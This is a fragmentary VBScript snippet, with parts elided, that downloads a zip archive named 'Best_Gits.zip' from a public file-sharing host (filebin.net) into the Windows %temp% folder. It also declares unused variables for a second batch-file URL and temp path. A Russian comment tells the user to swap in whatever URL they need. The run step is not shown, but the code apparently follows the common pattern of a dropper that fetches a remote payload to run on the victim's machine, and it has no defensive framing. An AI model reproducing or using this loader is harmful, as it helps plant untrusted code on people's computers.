...
Dim strURL, strTempFile, strBatchURL, strBatchTempFile
strURL = "https://filebin.net/x3cis5xi3dddkty8/Best_Gits.zip" ' Замените URL на нужный
strTempFile = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%temp%") & "\Best_Gits.zip" ' Имя файла для zip
...
DownloadFile strURL, strTempFile
